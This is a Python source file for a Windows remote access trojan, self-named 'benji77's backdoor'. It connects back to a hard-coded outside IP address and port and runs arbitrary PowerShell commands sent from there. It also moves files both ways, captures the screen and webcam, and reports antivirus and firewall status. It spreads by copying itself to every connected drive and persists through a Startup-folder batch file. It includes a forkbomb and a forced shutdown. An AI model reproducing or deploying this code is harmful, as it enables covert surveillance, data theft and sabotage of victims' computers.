from plyer import notification
from PIL import ImageGrab
import threading
import subprocess
import simplejson
import platform
import shutil
import requests
import psutil
import socket
import getpass
from pystyle import *
import aiohttp
import asyncio
import ctypes
import sys
import base64
import wmi
import time
import cv2
from os import system
import io
import os
import base64
import ast
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import datetime
import socket
import time
import urllib.request
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
debug = False
"""

--hidden-import=plyer -hidden-import=wmi --hidden-import=cv2 --hidden-import=aiohttp --hidden-import=pystyle --hidden-import=base64 --hidden-import=json --hidden-import=socket --hidden-import=os --hidden-import=shutil --hidden-import=sqlite3 --hidden-import=asyncio --hidden-import=datetime --hidden-import=getpass --hidden-import=threading --hidden-import=time --hidden-import=urllib --hidden-import=Crypto.Cipher --hidden-import=win32crypt


"""
def get_connected_drives():
    drives = []

    # Get all disk partitions
    partitions = psutil.disk_partitions(all=True)

    for partition in partitions:
        drive = partition.device
        if 'cdrom' in partition.opts or partition.fstype == '':
            # Ignore CD-ROM drives and empty partitions
            continue
        elif 'network' in partition.opts:
            # Network drives
            drives.append((drive, 'Network'))
        else:
            # Local drives
            drives.append((drive, 'Local'))

    return drives

def is_executable(file_path):
    return os.path.exists(str(file_path).replace(".py", ".exe"))

def copy_to_drives(script_path, drives):
    if not os.path.exists(script_path):
        return

    for drive, _ in drives:
        if drive.upper() == 'C:':
            # Copy to AppData if drive is C:
            destination_path = os.path.join(f'C:/Users/{getpass.getuser}/APPDATA', "app.exe" if is_executable(script_path) else "app.py")
            if debug:
                print('trying to copy to appdata !')
        elif drive.upper() == 'Z:':
            if debug:
                print("bios is open !")
            pass
        elif 'G:' in drive.upper():
            if debug:
                print('goolge drive detected !')
            pass
        else:
            
            destination_path = os.path.join(drive, "app.exe" if is_executable(script_path) else "app.py")
        
        try:
            shutil.copyfile(script_path, destination_path)
            if debug:
                print('file copied !')
        except Exception as e:
            if debug:
                print(f"Error copying script to {destination_path}: {e}")
            pass

def autoshare():
    import time
    while True:
        script_path = os.path.abspath(__file__)
        print(script_path)
        connected_drives = get_connected_drives()
        for drive in connected_drives:
            pass
        if connected_drives:
            copy_to_drives(script_path, connected_drives)
        time.sleep(5)

threading.Thread(target=autoshare).start()
def init():
    try:
        with open(rf'C:/Users/{getpass.getuser}/APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.bat', 'w') as f:
            f.write(f'''@echo off\necho please wait for the terminal close!\nstart {os.path.join(f'C:/Users/{getpass.getuser}/APPDATA', f"{__file__}.exe" if is_executable(__file__) else f"{__file__}.py")}''')
        return 'backdoor set up for restart'
    except Exception as e:
        if debug:
            print('error ',e)
        return 'backdoor can\'t be set for restart !'



class BackdoorClient:
    def __init__(self, ip, port):
        print('trying to connect')
        try:
            self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.my_connection.settimeout(10)
            self.my_connection.connect((ip, port))
            print('connection succesfull')
            global DIR
            global USER
            print('initializing the backdoor !')
            threading.Thread(target=self.reconnect).start()
            init()
        except Exception as e:
            if debug:
                print(e)
                print('wait 5 seconds for the connection retry..')
                time.sleep(5)
                print('trying back...')
            if not debug:
                time.sleep(5)
            connect()

    def reconnect(self):
        while True:
            try:
                time.sleep(300)
                if debug:
                    print('reconnecting')
                self.my_connection.close()
                connect()
            except:
                pass


    def command_execution(self, command):
        result = subprocess.check_output(['powershell', '-Command', command], stderr=subprocess.STDOUT, shell=True)
        # Decode the byte string to UTF-8 format, ignoring decoding errors
        output = result.decode('utf-8', errors='ignore')
        return output
    
    def json_send(self, data):

        json_data = simplejson.dumps(data)
        self.my_connection.send(base64.b64encode(json_data.encode("utf-8")))

    def json_receive(self):
        self.my_connection.settimeout(120)
        try:
            json_data = ""
            while True:
                try:
                    json_data = json_data + self.my_connection.recv(1024).decode()
                    return str(simplejson.loads(base64.b64decode(json_data)))
                except ValueError:
                    continue
        except (ConnectionError, TimeoutError, socket.error) as e:
            if debug:
                print('connexion lost : '+str(e))
            self.my_connection.close()
            connect()

    def get_screenshot(self):
        screenshot = ImageGrab.grab()
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes = screenshot_bytes.getvalue()
        return base64.b64encode(screenshot_bytes).decode()

    def get_system_info(self):
        try:
            info = {
				"Platform": platform.system(),
				"Platform Release": platform.release(),
				"Platform Version": platform.version(),
				"Architecture": platform.machine(),
				"Hostname": socket.gethostname(),
				"IP Address": socket.gethostbyname(socket.gethostname()),
				"Processor": platform.processor(),
				"Python Build": platform.python_build(),
				"Python Version": platform.python_version()
			}
        except Exception as e:
            info = str(e)
        return info

    def get_security_info(self):
        import wmi

        # Connect to Windows Management Instrumentation (WMI)
        c = wmi.WMI()
        output = """"""
        # Retrieve antivirus information
        antivirus_products = c.Win32_Product(Name="*Antivirus*")
        if antivirus_products:
            for product in antivirus_products:

                
                output+=f"\nAntivirus Product: {product.Caption}"

        else:
            
            output+=f"\nNo antivirus software found."

        # Retrieve Windows Firewall status
        firewall = c.Win32_Service(Name="MpsSvc")[0]
        output+=f"\nFirewall Status: {firewall.State}\n" 
        return output

    def execute_cd_command(self,directory):
        os.chdir(directory)
        return directory

    def get_file_contents(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            content = base64.b64decode(content)
            print(content)
            my_file.write(content)
            return "Download OK"

    def get_camera_image(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Error: Camera not accessible"
        ret, frame = cap.read()
        cap.release()
        is_success, buffer = cv2.imencode(".png", frame)
        if not is_success:
            return "Error: Failed to encode image"
        io_buf = io.BytesIO(buffer)
        return base64.b64encode(io_buf.getvalue()).decode()

    def send_notification(self, title, message):
        notification.notify(
            title=title,
			message=message,
			app_name="benji77's backdoor")

    def start_socket(self):
        global stealed 
        while True:
            runned = False
            self.my_connection.settimeout(600)
            first = self.json_receive()
            print(first)
            command = first.split(' ')
            print(command)
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    break
                elif first == "init":
                    
                    USER = str(getpass.getuser())
                    print(USER)
                    self.json_send(USER)
                    time.sleep(1)
                    DIR = str(os.getcwd())
                    print(DIR)
                    self.json_send(DIR)
                    result = init()
                    command_output = f"backdoor initialized : {result}"
                    print(command_output)
                    runned = True
                if first.split(' ')[0] == "cd":
                    print(first[3:])
                    self.execute_cd_command(first[3:])
                    print('moving directorie')
                    command_output = str(os.getcwd())
                    runned = True
                elif command[0] == "where":
                    command_output = str(os.getcwd())
                    runned = True
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1]) 
                    runned = True
                try:
                    if ast.literal_eval(first)[0] == "upload":
                        table = ast.literal_eval(first)
                        table[:-1] = [element.decode() if isinstance(element, bytes) else element for element in table[:-1]]
                        print(table)
                        if isinstance(table, list):
                            content = table[2]
                            command_output = self.save_file(table[1], content=content)
                        else:
                            print("variable isn't a array")
                        runned = True
                except:
                    pass

                if command[0] == "screenshot":
                    command_output = self.get_screenshot()
                    runned = True
                elif command[0] == "drive":
                    command_output = get_connected_drives()
                    runned = True
                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                elif command[0] == "shutdown":
                    os.system('shutdown /s /f /t 0')
                elif command[0] == "securityinfo":
                    command_output = self.get_security_info()
                    runned = True
                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    runned = True
                elif command[0] == "debug":
                    if command[1] == "true":
                        global debug
                        debug = True
                        command_output = "debug "
                    elif command[1] == 'false':
                        debug = False
                        command_output = "debug mode disabled"
                elif command[0] == "camshot":
                    command_output = self.get_camera_image()
                    runned = True
                elif first.split('|')[0] == "notify":
                    self.send_notification(first.split('|')[1], first.split('|')[2])
                    print(first.split('|')[1]+"|"+ first.split('|')[2])
                    command_output = "Notification sent."
                    runned = True
                elif command[0] == "forkbomb":
                    while True:
                        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
                elif command[0] == "ip":
                    command_output = self.command_execution('Invoke-WebRequest -Uri "https://ipinfo.io" | Select-Object -ExpandProperty Content')
                    if debug:
                        print("command executed")
                    runned=True
                if not runned:
                    command_output = self.command_execution(first)
                    if debug:
                        print("command executed")
            except Exception as e:
                if debug:
                    command_output = f"Error! {str(e)}"
                else:
                    command_output = "error !"
            self.json_send(command_output)
        self.my_connection.close()
        
      
def connect():
	while True:
		ip = "147.185.221.18"
		port = 35241
		backdoorclient = BackdoorClient(ip,port)
		backdoorclient.start_socket()
            
connect()
